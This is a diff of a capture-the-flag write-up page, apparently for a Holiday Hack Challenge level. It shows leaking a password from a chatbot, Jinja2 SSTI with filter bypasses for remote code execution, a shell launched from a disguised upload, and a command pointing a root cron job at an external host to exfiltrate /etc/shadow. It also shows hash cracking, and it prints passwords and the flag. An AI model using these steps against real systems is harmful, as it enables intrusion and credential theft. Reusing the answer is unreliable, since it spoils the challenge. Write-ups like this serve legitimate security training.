@@ -2,8 +2,17 @@
 layout: default
 title: act3_snowblindambush_mjd
 nav: |
-  |[Previous Objective: Act3 Free Ski](/act3_free_ski_mjd.md)  |   [Table of Contents](/index.md) | [About BerryDunn](/hhc_2025_berrydunn.md) |
-  | :----------------------- | :--------------------------------: | --------------------------------: |
+  <table>
+  <thead>
+  <tr>
+  <th>[Previous Objective: Act3 Free Ski](/act3_free_ski_mjd.md)</th>
+  <th>[Table of Contents](/index.md)</th>
+  <th>[About BerryDunn](/hhc_2025_berrydunn.md)</th>
+  </tr>
+  </thead>
+  <tbody>
+  </tbody>
+  </table>
 ---
 <table>
 <thead>
@@ -117,13 +126,13 @@ Initial discovery activities of the website uncovered the following:
 <li>The landing page code included a javascript file that was not actually loaded, egg.js</li>
 </ul>
 
-    <img src="/images/snowblind_egg.js.jpg" alt="Landing Page Code">
+    <img src="/HHC_2025/images/snowblind_egg.js.jpg" alt="Landing Page Code">
 
 <ul>
 <li>Reviewing the code gives a hint: "AI Gnomes do not know the difference between left and right"</li>
 </ul>
 
-    <img src="/images/snowblind_egghint.jpg" alt="Chatbot Script Hint">
+    <img src="/HHC_2025/images/snowblind_egghint.jpg" alt="Chatbot Script Hint">
 
 <ul>
 <li>AI chatbot gives redacted and conflicting hints about the password for the application login</li>
@@ -133,22 +142,21 @@ Initial discovery activities of the website uncovered the following:
 
    <strong>admin password: an_elf_and_password_on_a_bird</strong>
 
-<img src="/images/snowblind_adminpassword.jpg" alt="Admin Password">
-
+<img src="/HHC_2025/images/snowblind_adminpassword.jpg" alt="Admin Password">
 
 <ul>
 <li>File upload mechanism</li>
 </ul>
     The profile page contains a file upload mechanism. While the page indicates only allowed filetypes, it is possible to upload a file that contains script code. Upon upload, the file is renamed to admin_XXXXXXXXXXXXXXXX.png, with the placeholder changing with every upload. This is a way to get a payload into the application, but not a way to trigger it.
 
-    <img src="/images/snowblind_fileupload.jpg" alt="File Upload">
+    <img src="/HHC_2025/images/snowblind_fileupload.jpg" alt="File Upload">
 
 <ul>
 <li>Parameter used after file upload</li>
 </ul>
   After upload the page redirects and uses a parameter username.
 
-      <img src="/images/snowblind_parameter.jpg" alt="Redirect Parameter">
+      <img src="/HHC_2025/images/snowblind_parameter.jpg" alt="Redirect Parameter">
 
 <h2>Step Two: Explore SSTI and achieve RCE : Insecure Software</h2>
 <br>
@@ -160,7 +168,7 @@ The hint indicates that the application is using Flask. There are two helpful re
 
 A basic test to see if SSTI is possible is {{7*7}}. Because the application evaluates the expression and displays the results on the page, the application is likely vulnerable.
 
-<img src="/images/snowblind_sstitest.jpg" alt="SSTI Test">
+<img src="/HHC_2025/images/snowblind_sstitest.jpg" alt="SSTI Test">
 
 Trial and error testing revealed the following filters and the obfuscations needed to bypass.
 <br>
@@ -262,13 +270,13 @@ Trial and error testing revealed the following filters and the obfuscations need
 <br>
 A script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".
 
-The enumeration script source code is located here: <a href="/resources/snowblind_enumeration2.py.txt">Jinja2 SSTI Enumeration Script</a>
+The enumeration script source code is located here: <a href="/HHC_2025/resources/snowblind_enumeration2.py.txt">Jinja2 SSTI Enumeration Script</a>
 
-<img src="/images/snowblind_enumeration1.jpg" alt="SSTI Enumeration">
+<img src="/HHC_2025/images/snowblind_enumeration1.jpg" alt="SSTI Enumeration">
 
 The following indexes where discovered that would allow RCE:
 
-<img src="/images/snowblind_enumeration2.jpg" alt="SSTI Enumeration">
+<img src="/HHC_2025/images/snowblind_enumeration2.jpg" alt="SSTI Enumeration">
 
 <h2>Step Three: Achieve Shell Access Utilizing Insecure File Upload</h2>
 
@@ -294,7 +302,7 @@ sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
 
 With initial access established, time for more recon. An interesting cron job was located in /etc/cron/cron.d/mycron. It runs a backup script every minute as root.
 
-<img src="/images/snowblind_cronjob.jpg" alt="Cron Job">
+<img src="/HHC_2025/images/snowblind_cronjob.jpg" alt="Cron Job">
 
 The script does the following:
 <ul>
@@ -305,9 +313,9 @@ The script does the following:
 <li>if the regular experssion is true, it encrypts a copy of /etc/shadow and posts it to the url</li>
 </ul>
 
-<img src="/images/snowblind_regex.jpg" alt="URL Regex">
+<img src="/HHC_2025/images/snowblind_regex.jpg" alt="URL Regex">
 
-A copy of the backup script is located here: <a href="/resources/snowblind_backup.py.txt">Backup Script</a>
+A copy of the backup script is located here: <a href="/HHC_2025/resources/snowblind_backup.py.txt">Backup Script</a>
 
 An HTTP server was started on an external facing linux server on port 8000 to receive the data being exfitrated.
 
@@ -319,23 +327,23 @@ echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frost
 <br>
 </code></pre>
 
-The exfiltrated data file is located here: <a href="/resources/shadow_exfil.png">Exfiltrated File</a>
+The exfiltrated data file is located here: <a href="/HHC_2025/resources/shadow_exfil.png">Exfiltrated File</a>
 
 <h2>Step Five:  Decode PNG file</h2>
 
 Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.
 
-Using this script to decode: <a href="/resources/snowblind_decodepng3.py.txt">PNG Decoder Script</a>
+Using this script to decode: <a href="/HHC_2025/resources/snowblind_decodepng3.py.txt">PNG Decoder Script</a>
 
 The file was damaged or incomplete, so the script suppresses errors and forces the data to be extracted. The backup script indicates that the data is exfiltrated is stored in the Blue channel of the file. The other channels can be ignored. Running the script reveals the exfiltrated data stored in the file.
 
-<img src="/images/snowblind_decodedpng.jpg" alt="Decoded PNG File">
+<img src="/HHC_2025/images/snowblind_decodedpng.jpg" alt="Decoded PNG File">
 
 <h2>Step Six: Crack Hash for Root</h2>
 
 With the password hash, salt, and the algorithm used, we can attempt to crack the hash using John the Ripper and the rockyou word list.
 
-<img src="/images/snowblind_johntheripper.jpg" alt="John the Ripper">
+<img src="/HHC_2025/images/snowblind_johntheripper.jpg" alt="John the Ripper">
 
 <strong>root password: jollyboy</strong>
 
@@ -343,8 +351,7 @@ With the password hash, salt, and the algorithm used, we can attempt to crack th
 
 With root password, it is a simple matter to escalate privileges using the su command. Once root, there is a bash script in the /root directory. Executing the script reveals the flag.
 
-<img src="/images/snowblind_privilegeescalation.jpg" alt="Privilege Escalation">
-
+<img src="/HHC_2025/images/snowblind_privilegeescalation.jpg" alt="Privilege Escalation">
 
 <strong>Answer: hhc25{Frostify_The_World_c05730b46d0f30c9d068343e9d036f80}</strong>
 
